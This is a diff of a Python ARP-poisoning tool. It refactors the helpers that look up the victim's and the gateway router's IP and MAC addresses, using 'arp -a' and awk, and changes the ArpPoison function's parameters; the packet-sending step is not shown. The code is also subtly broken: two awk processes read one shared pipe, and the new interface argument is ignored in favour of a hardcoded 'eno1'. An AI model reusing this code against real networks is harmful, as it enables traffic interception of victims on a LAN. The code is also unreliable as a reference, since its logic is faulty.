@@ -19,19 +19,23 @@ def getMacAddrFromIP(ip):
         mac = cmd2.communicate()[0].rstrip()
         return mac
     else:
-        exit("Could not establish connection to victim IP. Exiting...")
+        exit("Could not establish connection to {}. Exiting...".format(ip))
 
 
-def getRouterIP():
+def getRouterInfo():
     cmd1 = Popen(['arp', '-a'], stdout=PIPE)
     cmd2 = Popen(['awk', '/gateway/ {print $2}'], stdin=cmd1.stdout, stdout=PIPE)
-    routerIP = cmd2.communicate()[0]
-    return re.sub('[\(\)\{\}<>]', '', routerIP)
+    cmd3 = Popen(['awk', '/gateway/ {print $4}'], stdin=cmd1.stdout, stdout=PIPE)
+    routerIP = re.sub('[\(\)\{\}<>]', '', cmd2.communicate()[0])
+    routerMAC = cmd3.communicate()[0].rstrip()
+    return (routerIP, routerMAC)
 
 
-def ArpPoison(targetIP):
-    routerIP = getRouterIP()
-    routerMAC = getMacAddrFromIP(routerIP)
+def ArpPoison(victimIP, routerIP, iface):
+    if(routerIP is None):
+        routerIP, routerMAC = getRouterInfo()
+    else:
+        routerMAC = getMacAddrFromIP(routerIP)
     victimMAC = getMacAddrFromIP(victimIP)
     hostMAC = getHostMacAddr("eno1")
 
